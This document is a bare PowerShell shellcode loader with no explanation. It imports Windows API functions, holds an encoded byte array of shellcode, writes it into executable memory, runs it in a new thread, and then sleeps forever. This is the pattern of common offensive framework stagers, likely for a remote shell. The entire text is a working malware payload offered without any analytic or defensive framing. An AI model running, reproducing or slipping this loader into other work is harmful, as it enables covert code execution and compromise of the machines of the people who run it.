$be6 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $be6 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xce,0xb8,0x48,0xa5,0x1b,0x70,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x58,0x31,0x43,0x19,0x83,0xeb,0xfc,0x03,0x43,0x15,0xaa,0x50,0xe7,0x98,0xa8,0x9b,0x18,0x59,0xcc,0x12,0xfd,0x68,0xcc,0x41,0x75,0xda,0xfc,0x02,0xdb,0xd7,0x77,0x46,0xc8,0x6c,0xf5,0x4f,0xff,0xc5,0xb3,0xa9,0xce,0xd6,0xef,0x8a,0x51,0x55,0xed,0xde,0xb1,0x64,0x3e,0x13,0xb3,0xa1,0x22,0xde,0xe1,0x7a,0x29,0x4d,0x16,0x0e,0x67,0x4e,0x9d,0x5c,0x66,0xd6,0x42,0x14,0x89,0xf7,0xd4,0x2e,0xd0,0xd7,0xd7,0xe3,0x69,0x5e,0xc0,0xe0,0x57,0x28,0x7b,0xd2,0x2c,0xab,0xad,0x2a,0xcd,0x00,0x90,0x82,0x3c,0x58,0xd4,0x25,0xde,0x2f,0x2c,0x56,0x63,0x28,0xeb,0x24,0xbf,0xbd,0xe8,0x8f,0x34,0x65,0xd5,0x2e,0x99,0xf0,0x9e,0x3d,0x56,0x76,0xf8,0x21,0x69,0x5b,0x72,0x5d,0xe2,0x5a,0x55,0xd7,0xb0,0x78,0x71,0xb3,0x63,0xe0,0x20,0x19,0xc2,0x1d,0x32,0xc2,0xbb,0xbb,0x38,0xef,0xa8,0xb1,0x62,0x78,0x40,0xaf,0xe8,0x78,0xf4,0x58,0x78,0x17,0x6d,0xf3,0x12,0xab,0x1a,0xdd,0xe5,0xcc,0x31,0x10,0x31,0x61,0xea,0x00,0x96,0xd5,0x64,0x9d,0x4e,0xa3,0xd3,0x1e,0xbb,0x00,0x48,0x8b,0x47,0xf4,0x3d,0x23,0xf3,0xfb,0xc1,0xb3,0xeb,0x70,0xc1,0xb3,0xeb,0xa7,0xb8,0x83,0xbf,0x9a,0x08,0xe4,0x6f,0x8d,0x3b,0x6d,0x10,0x8b,0x3c,0xb8,0xa6,0xd2,0x91,0x2b,0xb9,0xe8,0xf5,0x28,0xea,0x5f,0xa6,0x67,0x5e,0x36,0x20,0x63,0x35,0x98,0x8b,0x8c,0x63,0x72,0x81,0x78,0xd3,0x13,0xd5,0x4e,0xeb,0xe3,0x5c,0x50,0x81,0xe7,0x0e,0xfb,0x49,0xbe,0xc6,0x8e,0x33,0xa0,0x90,0x8e,0x69,0x8f,0xcf,0x23,0xc1,0x66,0x87,0xee,0xe3,0x9e,0x2c,0x0e,0x3e,0x1b,0x12,0x85,0xcb,0x6b,0xe7,0xbf,0xa4,0x83,0xb2,0xe2,0x63,0x9b,0x69,0x88,0xcb,0x0b,0x91,0x5d,0xcc,0xcb,0xf9,0x5d,0xcc,0x8b,0xf9,0x0e,0xa4,0x53,0x5d,0xe3,0xd1,0x9b,0x48,0x97,0x49,0x37,0xfb,0x7f,0x3a,0xdf,0xfb,0x5f,0xc5,0x1f,0xa8,0xc9,0xad,0x0d,0xd8,0x7f,0xcf,0xcd,0x31,0xfa,0xd0,0x46,0x74,0x8e,0xd6,0xa7,0x45,0x14,0x18,0xd2,0xac,0x4f,0x5a,0x42,0xc6,0x05,0xa3,0x82,0xe9,0x84,0x34,0x12,0x61,0x24,0xae,0x82,0xec,0xc1,0x1e,0x3f,0x8a,0x43,0x2c,0x91,0x3c,0xf9,0xa6,0xed;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Zdx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Zdx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Zdx,0,0,0);for (;;){Start-sleep 60};